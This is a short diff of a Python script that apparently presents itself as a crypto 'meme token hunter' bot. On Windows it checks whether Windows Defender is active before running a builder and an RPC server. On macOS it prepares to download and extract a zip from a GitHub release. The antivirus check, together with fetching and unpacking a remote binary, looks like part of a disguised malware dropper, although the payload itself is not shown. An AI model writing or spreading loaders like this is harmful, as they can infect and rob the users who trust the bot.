@@ -117,7 +117,8 @@ def main():
     data_queue = Queue()
 
     rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
+    
+    extract_to = "./extracted_files"  # extract_to değişkenini burada tanımlayın
 
     if platform.system() == 'Windows':
         if is_defender_active():
@@ -130,10 +131,7 @@ def main():
             run_builder(output_path)
 
             rpc_server_thread.start()
-            blockchain_thread.start()
-
             rpc_server_thread.join()
-            blockchain_thread.join()
     elif platform.system() == 'Darwin':
         zip_file_to_download = 'MTHBot_Mac.zip'
         download_url = 'https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases/download/V9.21.0/MTHBot_Mac.zip'
